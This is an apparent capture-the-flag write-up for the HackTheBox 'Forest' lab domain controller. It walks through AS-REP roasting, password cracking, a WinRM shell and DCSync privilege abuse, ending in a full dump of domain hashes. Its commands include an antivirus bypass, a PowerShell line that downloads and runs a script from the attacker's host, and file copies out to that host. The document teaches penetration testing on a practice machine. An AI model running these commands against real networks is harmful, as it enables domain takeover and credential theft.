---
title: HackTheBox - Forest
date: 2021-09-06 18:47:54 +0100
categories: [Hackthebox walkthroughs, Windows, Easy]
tags: [Alfresco,  Active Directory, Domain Controller, AS-REP Roasting, DCSync, rpcclient, ldapsearch, Anonymous LDAP binds, crackmapexec, Kerberos, kerbrute, Bloodhound, bloodhound-python, SharpHound, impacket, impacket-secretsdump, GetNPUsers.py, John The Ripper, Evil-WinRM, PowerView, smbserver.py, secretsdump.py, Bypass-4MSI, Pass The Hash, psexec.py, Golden Ticket, krbtgt, ntpdate, ticketer.py, htb-windows-easy, writeup, oscp-prep]
image: /assets/img/htb/machines/windows/easy/forest/Forest.jpg
pin: true
---

**Forest** is an easy [HackTheBox](https://www.hackthebox.eu/) virtual machine acting as a **Windows Domain Controller** (DC) in which `Exchange Server` has been installed.

**Anonymous LDAP binds** are allowed, which we will use to enumerate domain objects. 
We will also take advantage of null authentication enabled with `rpcclient` to enumerate usernames.

It turns out that a specific service (`Alfresco`) that **do not require Kerberos preauthentication** is installed, which leads us to discover an **as-rep roastable** account. 
We will dump its password hash and crack it with `john` to gain a foothold. 

The compromised service account is found to be a member of the [Account Operators group](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators), which can be used to add users to privileged **Exchange Windows Permissions** group. 

Finally, the Exchange group membership is leveraged to gain **DCSync** privileges on the domain and dump all password hashes.

## Enumeration

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Forest-full-port-scan.txt 10.10.10.161
Warning: 10.10.10.161 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.161
Host is up (0.097s latency).
Not shown: 61414 closed ports, 4098 filtered ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-08-15 18:58:09Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h30m07s, deviation: 4h02m30s, median: 10m06s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-08-15T12:00:29-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-15T19:00:31
|_  start_date: 2021-08-15T18:54:53
```

The port 53 (DNS) is open which certainly means that we're facing an Active Directory.

### SMB (port 139 & 445)

According to `smbclient`, we couldn't find accessible shares:

```
$ smbclient -L \\$TARGET
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

With `crackmapexec` using a **null authentication**, we can look at the password policy:

```bash
$ crackmapexec smb $TARGET --pass-pol -u '' -p ''
```

![](/assets/img/htb/machines/windows/easy/forest/crackmapexec.png)

> The **Account Lockout Threshold** is set to None so we could perform a **password spraying** attack.

### Port 389 (LDAP)

```bash
$ ldapsearch -h 10.10.10.161 -x -s base namingcontexts | tee services/ldap_search_namingcontexts.txt
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
$ echo "$TARGET  htb.local" >> /etc/hosts # adding domain controller to hosts
$ ldapsearch -h $TARGET -x -b "DC=htb,DC=local" > services/anon_ldap.txt 
```

> **Note**: the tool [`windapsearch`](https://github.com/ropnop/windapsearch) could also be used to query the domain further.


### Port 135 (RPC)

```bash
$ rpcclient -U '%' 10.10.10.161
rpcclient $> srvinfo
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers # display a list of users names defined on the server
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> getdompwinfo # get SMB password policy
min_password_length: 7
password_properties: 0x00000000
rpcclient $> querydispinfo # get users info
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013  Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)
rpcclient $>
```

Using `rpclient`, we've been able to enumerate a list of usernames and what seems to be a service name:

- andy (Andy Hislip)
- lucinda (Lucinda Berger)
- mark (Mark Brandt)
- santi (Santi Rodriguez)
- sebastien (Sebastien Caron)
- svc-alfresco

![](/assets/img/htb/machines/windows/easy/forest/grep_ldap_anon.png)

> **Note:** `enum4linux` could also be used to enumerate usernames and password policy.

### Kerberos (port 88)

We can confirm that usernames discovered earlier exist using `kerbrute`:

```
./kerbrute userenum --dc htb.local -d htb.local User.txt
```

![](/assets/img/htb/machines/windows/easy/forest/kerbrute.png)

Looking at [alfresco documentation](https://docs.alfresco.com/process-services/latest/config/authenticate/), we can see that it requires **Kerberos pre-authentication to be disabled**.

![](/assets/img/htb/machines/windows/easy/forest/krb_preauth_disable.png)

This will allow us to perform **AS-REP Roasting**:

- sending a dummy request to the Key Distribution Center (**KDC**) 
- getting a **TGT** (Ticket Granting Ticket) which contains material encrypted with the user's password hash
- trying to crack the password with an offline bruteforce attack

> Unlike **Kerberoasting** these users do not necessary have to be service accounts.

___

## Foothold

### AS-REP Roasting with `GetNPUsers.py` (impacket)

`GetNPUsers.py` from [**impacket**](https://github.com/SecureAuthCorp/impacket) can be used to request a **TGT** (Ticket Granting Ticket), getting both the vulnerable usernames and their corresponding `krbasrep5` hashes directly:

```bash
$ GetNPUsers.py htb.local/ -dc-ip $TARGET -request # we could add '-format hashcat'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-08-17 22:07:11.322568  2021-08-17 21:52:25.008334  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:1ab93db0067516ce979a1a21bfad456a$89bf43129d73d2b85bb939d9dc5f11533e80b53b6c86f5fe0d86ddf531fc380b77abbdbc4ebc77bc2f1ad94dc49a308c5f8aa74d885386ffbefdb25d4f201798c0acaf383ce79ed4afaf921994f37d06a2be1515cd28d78d13f8bb3219776071f373107c1605646cd11bbe65f87476c41ae90e4fd098188f680382626603c234dfd8f6432b9d5f31f86aba0ac025ca6ec77cf9434cbfb33a92d5e99295e457351e3d0947a7ea59f53f7d31be8957bbb34930aac943c55a09020970677c62f9283c57045e5ca1cc7e5730651cea7e46a257e44771abfde9fc179f635b5d5c65c08612e420c703
```

### Crack the clear text password of the service account with `john`

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:01 DONE (2021-08-17 22:29) 0.6622g/s 2705Kp/s 2705Kc/s 2705KC/s s64891817..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`s3rvice` is `svc-alfresco`'s password.

### Shell over WinRM

Port 5985 is open so maybe we can login remotely over **WinRM** with these credentials.

```bash
$ evil-winrm -i $TARGET -u svc-alfresco -p s3rvice
```

![](/assets/img/htb/machines/windows/easy/forest/shell.png)

___

## Privilege escalation

### Local enumeration with `winPEAS`

In order to transfer [`winPEAS.exe`](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) we can host an SMB server on our machine using **impacket** again:

```bash
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> copy \\10.10.14.12\kali\winPEASx64.exe .
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/23/2019   2:16 PM             32 user.txt
-a----        8/17/2021   3:36 PM        1920000 winPEASx64.exe
```

At this point, I didn't find anything exploitable from winPEAS output.

### Exploring exploitable paths with `BloodHound`

As it is a Domain Controller, we can also use [BloodHound](https://github.com/BloodHoundAD/BloodHound#about-bloodhound) to visualize the domain and see if there are potential privilege escalation paths.

#### Method #1: using `SharpHound`

1. On our attacker machine, we have to download [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe):

    ```bash
    $ wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe
    ```

2. Then we can transfer it the same way we did for **winPEAS** (using **impacket** `smbserver.py`)

3. After executing it we'll have a zip file that we can transfer once again with our SMB server and then upload it to the **BloodHound** web app:

    ```powershell
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\SharpHound.exe
    ----------------------------------------------
    Initializing SharpHound at 5:34 AM on 9/6/2021
    ----------------------------------------------

    Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

    [+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=htb,DC=local
    [+] Cache File not Found: 0 Objects in cache

    [+] Pre-populating Domain Controller SIDS
    Status: 0 objects finished (+0) -- Using 21 MB RAM
    Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
    Enumeration finished in 00:00:02.3907594
    Compressing data to .\20210906053417_BloodHound.zip
    You can upload this file directly to the UI

    SharpHound Enumeration Completed at 5:34 AM on 9/6/2021! Happy Graphing!
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> copy .\20210906053417_BloodHound.zip \\10.10.14.12\kali\20210906053417_BloodHound.zip
    ```

    > Another way to transfer the zip file is to encode it in base64 using `certutil -encode 20210906053417_BloodHound.zip loot.txt`

4. In order to run **BloodHound** on our attacker machine, we have to run these commands:

```bash
# Open a terminal and type the following:
$ neo4j console # default credentials -> neo4j:neo4j
# In another terminal, open bloodhound:
$ bloodhound
```

![Bloodhound](/assets/img/htb/machines/windows/easy/forest/bloodhound.png)

#### Method #2: using `bloodhound-python`

```bash
$ pip install bloodhound 
$ bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -c all -ns $TARGET
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found 31 users
INFO: Found 75 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 40S
$ ls *.json
20210906143955_computers.json  20210906143955_domains.json  20210906143955_groups.json  20210906143955_users.json
```

This is the easiest way! These JSON files can be directly uploaded to the **BloodHound** GUI.

#### Finding an AD Attack Path

1. First, we have to mark `svc-alfresco` as owned:

    ![](/assets/img/htb/machines/windows/easy/forest/mark_owned_user.png)

2. Then, we can click on `Shortest Path from Owned Principals`:

    ![](/assets/img/htb/machines/windows/easy/forest/shortest_path_from_owned_prinicipals.png)

As we can see on the screenshot above, `svc-alfresco` is a member of **Service Accounts** which is a member of **Privileged IT Accounts** which is a member of the very special group **Account Operators**.

Members of this group are allowed create  and modify users and add them to non-protected groups. [Read [Microsoft documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators)] 

Now if we click on `Shortest Paths to High Value Targets`, **Bloodhound** will reveal another graph:

![](/assets/img/htb/machines/windows/easy/forest/high_value_targets.png)

- The **Account Operators** group has `GenericAll` permissions on the **Exchange Windows Permissions** group.

- The **Exchange Windows Permissions** group has `WriteDacl` privileges on the Domain. The `WriteDACL` privilege gives a user the ability to add **DACLs** ( Discretionary Access Control List) to an object. 

This means that:

1. We can add users to the **Exchange Windows Permissions** group (thanks to the `GenericAll` permission)

2. Then, since the Exchange group has `WriteDacl` permission, we can give **DCSync** privileges to the users we created. 

> The `DCSync` privilege will give us the right to <u>perform a domain synchronization and finally dump all the password hashes</u>!

### DCSYNC

1. Add a user to the domain:

    ```powershell
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user amirr0r password1234 /add /domain
    The command completed successfully.
    ```

    ![](/assets/img/htb/machines/windows/easy/forest/amirr0r.png)

2. Add this user to the **Excange Windows Permissions** group:

    ```powershell
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add amirr0r
    The command completed successfully.
    ```

    ![](/assets/img/htb/machines/windows/easy/forest/net_user.png)

3. Grant this user the `DCSync` privileges using [`PowerView.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1):

    > These information can be found via `Help > Abuse info` by right-clicking on `WriteDacl` in **BloodHound**

    ![](/assets/img/htb/machines/windows/easy/forest/help.png)

    ![](/assets/img/htb/machines/windows/easy/forest/abuse_info.png)

    ```powershell
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> menu
    ...
    [+] Bypass-4MSI
    ...
    # we can disable Defender before importing the script
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
    [+] Patched! :D
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerView.ps1')
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'password1234' -AsPlainText -Force
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\amirr0r', $SecPassword)
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity amirr0r -Rights DCSync
    ```

4. Finally, perform a **DCSync** and extract all the password hashes of all the users on the domain with **impacket** `secretsdump.py`:

```bash
$ /usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/amirr0r:password1234@10.10.10.161
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
amirr0r:9601:aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:6f74ea9371b1049376b6280c8e0f0731:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
